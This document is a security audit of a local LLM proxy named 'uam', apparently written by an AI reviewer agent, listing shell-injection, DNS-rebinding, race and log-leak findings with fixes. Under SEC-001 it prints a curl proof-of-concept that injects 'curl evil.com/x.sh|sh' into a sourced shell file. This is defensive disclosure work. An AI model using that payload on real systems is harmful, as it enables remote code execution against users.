# uam — Security Issues

Security review of production hardening (Phases 1–5), commits since `23e094c`.
Reviewer: SecurityReviewer agent. Date: 2026-04-05.

Status legend: OPEN / FIXED / WONTFIX / INFO

---

## CRITICAL

### SEC-001 — Shell injection via `/state` POST → `~/.uam/env.sh` [FIXED]

**Fix:** `write_env_file()` now uses `shlex.quote()` on every interpolated
value (default, friendly_name, capability list). Verified by
`tests/test_security_and_correctness_fixes.py::TestWriteEnvFileShellInjectionSafe`
which sources the generated file in a clean shell with malicious payloads
and confirms no command execution.

**File:** `src/uam/state.py:226-230`, `src/uam/proxy.py:544-582`

**Description:** `write_env_file()` interpolates `state["default"]` and the friendly
alias name directly into double-quoted shell `export` statements:

```python
lines.append(f'export ANTHROPIC_DEFAULT_SONNET_MODEL="{default}"')
lines.append(f'export ANTHROPIC_DEFAULT_SONNET_MODEL_NAME="{friendly_name}"')
lines.append(
    f'export ANTHROPIC_DEFAULT_SONNET_MODEL_SUPPORTED_CAPABILITIES="{caps_str}"'
)
```

There is no escaping of `"`, `\`, `$`, or backticks. The values flow from
`POST /state` (`handle_post_state`), which is **unauthenticated** — any local
process (or browser via DNS rebinding to 127.0.0.1) can write arbitrary content.

**Attack vector:**

```bash
curl -X POST http://127.0.0.1:5100/state -d '{
  "default": "x\";curl evil.com/x.sh|sh;echo \"",
  "models": {"x\";curl evil.com/x.sh|sh;echo \"": {"enabled": true, "capabilities": []}}
}'
```

When the user opens a new shell that sources `~/.uam/env.sh` (or runs `source
~/.uam/env.sh` per the install instructions), the injected command executes as
the user. This is a full local code execution against any user running uam.

The same applies to `friendly_name` (taken from `aliases` map values controlled
by the same POST) and `caps_str` (joined from `capabilities` list values).

**Recommended fix:**
1. Use `shlex.quote()` for every interpolated value, OR
2. Use POSIX `printf '%s\n' "..."` style with rigorous sanitization, OR
3. Validate `default`/alias/capability values against a strict character allowlist
   (`[A-Za-z0-9._:/-]+`) and reject anything else at the `handle_post_state` boundary.
4. Additionally, require an auth token on `/state` POST (see SEC-002).

---

### SEC-002 — `/state` POST is unauthenticated; no Host header check (DNS rebinding) [OPEN]

**File:** `src/uam/proxy.py:544-582`, `src/uam/__main__.py`

**Description:** The proxy listens on `127.0.0.1:5100` and exposes `POST /state`,
`POST /refresh`, `POST /v1/messages`, `POST /v1/messages/ask` with no
authentication. Any local process running as any user on the machine can:

- Mutate model state (toggle models, change default, inject aliases)
- Trigger SEC-001 shell injection
- Send requests through the proxy and consume the user's API credits

Browser-based DNS rebinding attacks: a malicious page can rebind a hostname to
127.0.0.1 and POST to the proxy, because there is no `Host:` header validation
or CORS preflight enforcement.

**Recommended fix:**
1. Validate `request.host` is `127.0.0.1:5100` / `localhost:5100` and reject
   otherwise.
2. Require a token (read from `~/.uam/token`, perms 0600, generated at first
   start) on all mutating endpoints (`/state`, `/refresh`).
3. Also reject requests whose `Origin` or `Referer` header is set to a non-local
   origin (rebinding defense for browsers that send Origin).

---

## HIGH

### SEC-003 — Model on/off enforcement bypass via unknown Claude-passthrough names [OPEN]

**File:** `src/uam/proxy.py:118-125`, `src/uam/router.py:86-96`

**Description:** `_resolve_default_swap` does:

```python
route = router.resolve(model)
if route:
    if model in state.get("models", {}) and not is_enabled(model, state):
        return None, model
    return route, model
```

`router.resolve()` for an unknown model falls through to the `default_backend`
(Anthropic) and returns a synthesized route using the user's real Anthropic
key, regardless of the requested model name. The enabled check is gated on
`if model in state.get("models", {})`, so a model name that is *not* in state
silently bypasses the on/off enforcement and goes straight to Anthropic with
the user's real key.

**Attack vector:** A local attacker (or any HTTP client able to reach the proxy)
calls `POST /v1/messages` with `{"model": "anything-not-in-state", ...}` and
gets a free pass to Anthropic on the user's tab, even after the user has
"disabled" all Claude models in `/model`.

**Recommended fix:** Make the enabled check authoritative — if the resolved
backend is Anthropic and the model is not explicitly enabled in state, reject
with 403. Alternatively, only fall through to default_backend for *known*
Anthropic model IDs.

---

### SEC-004 — `redact_headers` is defined but never called [FIXED]

**Fix:** `_build_upstream_headers()` now calls
`logger.debug("Upstream headers: %s", redact_headers(headers))` on every
request. This both validates the function and ensures any future "log the
request" change cannot accidentally leak `Authorization`/`X-Api-Key`.
Verified by `TestBuildHeadersLogsRedacted` (asserts the real key never
appears in any captured log record).

**File:** `src/uam/log.py:43-52`

**Description:** `redact_headers()` exists but `grep -r redact_headers
src/` shows zero call sites. The function is dead code; nothing in the proxy
actually redacts before logging. Today this happens to be safe because no
log statement currently dumps a header dict, but the presence of the function
gives a false sense of safety and any future "log the request" change will
silently leak `Authorization` / `X-Api-Key`.

**Recommended fix:** Either (a) call `redact_headers` at the actual log
boundary in proxy.py (e.g. wrap upstream header logging with it), or (b)
delete the function and add a code-comment policy "never log header dicts".
Add a unit test that asserts no log line in a request lifecycle contains
key material.

---

### SEC-005 — Non-atomic `save_state` write — corruption window [FIXED]

**Fix:** `save_state()` now writes to a `tempfile.mkstemp(dir=...)` tmp
file and `os.replace()`s it atomically. On failure the tmp file is
unlinked. The original `models.json` is never truncated. Verified by
`TestSaveStateAtomic` (simulates mid-write failure and confirms original
file is preserved + no leftover .tmp files).

**File:** `src/uam/state.py:21-24`, `src/uam/proxy.py:561-582`

**Description:** `save_state()` calls `STATE_PATH.write_text(...)` which is
*not* atomic. A SIGTERM, OOM kill, or disk-full event during the write
truncates `models.json`. The next `load_state()` swallows
`json.JSONDecodeError` and silently returns a default empty state, wiping
all of the user's enabled-flags, aliases, and default model.

Combined with **SEC-006** (race), two concurrent `POST /state` calls can
interleave their writes and corrupt the file even without a crash.

**Recommended fix:** Atomic write — write to `models.json.tmp` then
`os.replace()` to `models.json`. Same for `write_env_file`.

---

### SEC-006 — Race condition on concurrent `/state` POSTs [OPEN]

**File:** `src/uam/proxy.py:544-582`, `src/uam/state.py:11-24`

**Description:** `handle_post_state` does load → mutate → save with no lock.
aiohttp serves requests concurrently. Two concurrent POSTs:

1. Both call `load_state()` → both see version A.
2. POST1 mutates `models["x"].enabled = False`, POST2 mutates
   `models["y"].enabled = False`.
3. POST1 calls `save_state()` writing `{x:false, y:true}`.
4. POST2 calls `save_state()` writing `{x:true, y:false}`.

POST1's update is lost. The cache invalidation also races with `_get_state`
in unrelated request handlers.

**Recommended fix:** Wrap state mutations in an `asyncio.Lock` held across
load → mutate → save → write_env_file. Combine with atomic write (SEC-005).

---

## MEDIUM

### SEC-007 — `~/.uam/env.sh` chmod 0o644 — world/group readable [OPEN]

**File:** `src/uam/state.py:235`

**Description:** `env_path.chmod(0o644)` makes the file readable by group
and other users. Today the file does not contain secret values (model id +
friendly name + capability list), so this is **not** an immediate key
disclosure. However:

1. The file's contents are already user-controllable via SEC-001, so
   anything an attacker chooses to inject becomes visible to all local users.
2. The same code path is the obvious place where future maintainers will add
   `export ANTHROPIC_API_KEY=...` style exports — at which point 0o644 leaks
   the key to every local user.
3. The neighboring `~/.uam/models.json` is written with default umask (also
   typically 0o644) — same concern.

**Recommended fix:** `env_path.chmod(0o600)`. Apply the same to
`models.json`, `config.json`, and `uam.pid`. Document the policy in
`CLAUDE.md` Security section.

---

### SEC-008 — Upstream error bodies forwarded verbatim may leak internals [OPEN]

**File:** `src/uam/proxy.py:318-328`, `src/uam/proxy.py:262-267`,
`src/uam/proxy.py:406-413`

**Description:** `_make_anthropic_error` and the streaming/ask error paths
read the upstream error body and forward it (or its `error.message` field)
to the caller. Backends (especially RunPod proxy errors and vLLM tracebacks)
sometimes include internal URLs, hostnames, or even token fragments in
error messages. A buggy backend that echoes the `Authorization: Bearer ...`
header in its error response would leak the key into the proxy response.

**Recommended fix:** Allowlist a small set of fields from upstream error
bodies (`type`, `message` truncated to N chars) and run a key-pattern
scrubber (regex for `sk-…`, `Bearer …`, `[A-Za-z0-9_-]{40,}`) before
forwarding. Log the original upstream error to file only.

---

### SEC-009 — `discover_runpod` GraphQL POST has no per-request timeout [OPEN]

**File:** `src/uam/discovery/runpod.py:28-35`

**Description:** Unlike the per-pod model probe (line 79-83) which uses
`aiohttp.ClientTimeout(total=10)`, the main GraphQL POST relies solely on
the session-level `total=600` timeout from `router.py:28`. A slow/wedged
RunPod API can stall discovery for 10 minutes per account, blocking
`/refresh` and proxy startup.

**Recommended fix:** Add `timeout=aiohttp.ClientTimeout(total=15)` to the
GraphQL POST. Same hardening applies to `discover_anthropic` (which is
synchronous and doesn't make network calls — OK) and is already done for
openrouter (15s) and local probe (5s).

---

### SEC-010 — `_proxy_anthropic_native` exception handler leaks `str(e)` [OPEN]

**File:** `src/uam/proxy.py:211-216`, `src/uam/proxy.py:310-315`,
`src/uam/proxy.py:417-422`, `src/uam/proxy.py:440-445`, `src/uam/proxy.py:490-495`

**Description:** Catch-all `except Exception as e:` blocks return
`{"error": {"message": str(e)}}` to the client. aiohttp/SSL errors
sometimes include the target URL (which for runpod includes the pod id) and,
in rare cases, the request headers. This is mainly an information-disclosure
issue, not key leakage, but it provides reconnaissance to a local attacker
about which RunPod pods are configured.

**Recommended fix:** Return a generic `"upstream connection failed"` to the
client and log the full exception (with traceback) to `~/.uam/uam.log`.
Use the `logger.exception(...)` pattern so stack traces are captured.

---

## LOW

### SEC-011 — `_extract_alias` / `infer_capabilities` unbounded model-id input [LOW] [OPEN]

**File:** `src/uam/state.py:90-183`

**Description:** Model IDs flow from upstream `/v1/models` discovery and from
the `/state` POST endpoint. They are passed through `re.match`, `.lower()`,
and string searches with no length cap. A malicious upstream returning a
1MB model id would cause O(n) work per request inside the hot path
(`_get_state`) on each refresh.

Not exploitable for code execution, just a small DoS amplifier from a
compromised upstream.

**Recommended fix:** Reject model ids longer than 256 characters at the
discovery boundary.

---

### SEC-012 — `load_state` swallows JSON / OSError silently [OPEN]

**File:** `src/uam/state.py:11-18`

**Description:** Both `json.JSONDecodeError` and `OSError` reset the user's
state to defaults with no log line. A permission glitch on `~/.uam/models.json`
(e.g. after a `sudo` operation) silently nukes all configuration on the next
read. Combine with SEC-005 (non-atomic write) and a single crash can
destroy all user state with no audit trail.

**Recommended fix:** `logger.error("Failed to load state: %s", e)` in the
except block. Consider keeping a `models.json.bak` rotation.

---

### SEC-013 — `print()` to stdout in proxy handlers (not redacted, not log-rotated) [PARTIAL]

**Fix:** `discovery/local.py:80` `print()` replaced with `logger.info()`.
Verified by `TestLocalDiscoveryNoPrint`. The remaining `print()` calls in
`proxy.py:520, 524` (handle_refresh status output) are intentional
console feedback for the user-initiated `/refresh` command and remain.

**File:** `src/uam/proxy.py:520, 524`, `src/uam/discovery/local.py:80`

**Description:** Several handlers still use `print()` instead of `logger.*`.
These bypass the log level / rotation / future redaction layer. Today they
print model ids only (safe), but they violate the "all logging through the
configured logger" invariant.

**Recommended fix:** Replace `print(...)` with `logger.info(...)` everywhere
in proxy.py and discovery/.

---

## VERIFIED — No issues found

- **API key exposure in log statements** — VERIFIED. No `logger.*` or
  `print()` call in the reviewed files passes an `api_key`, header dict
  containing keys, or full route dict (which contains `api_key`) to a logger.
  Discovery modules log only counts and route_keys.
- **Path traversal** — VERIFIED. No user-controlled string is concatenated
  into a filesystem path. `STATE_PATH`, `ENV_PATH`, `LOG_DIR`, `CONFIG_PATH`
  are all hardcoded constants relative to `Path.home()`.
- **Translation deep-recursion** — VERIFIED. `anthropic_to_openai` /
  `openai_to_anthropic` walk content blocks one level deep with no recursion;
  a deeply-nested malicious payload cannot blow the stack inside translation
  itself. (aiohttp's `await request.read()` does not impose a body size
  cap by default — see follow-up note below.)

---

## Follow-up notes (not findings, but worth doing)

- **No request body size limit.** `await request.read()` will buffer arbitrarily
  large bodies into RAM. Consider `client_max_size` on the `web.Application`
  (default is 1 MiB, which is actually fine — confirm it isn't overridden).
- **No rate limiting** on `/refresh` — an attacker can force repeated discovery
  storms against RunPod / OpenRouter, burning the user's API quota.
- **`get_config()`** does not catch `JSONDecodeError`; a corrupt
  `~/.uam/config.json` crashes proxy startup. This is the *opposite* of the
  state.py bug — here we silently destroy state, there we crash. Pick one
  consistent policy (prefer crash-loud on config, log-and-default on state).
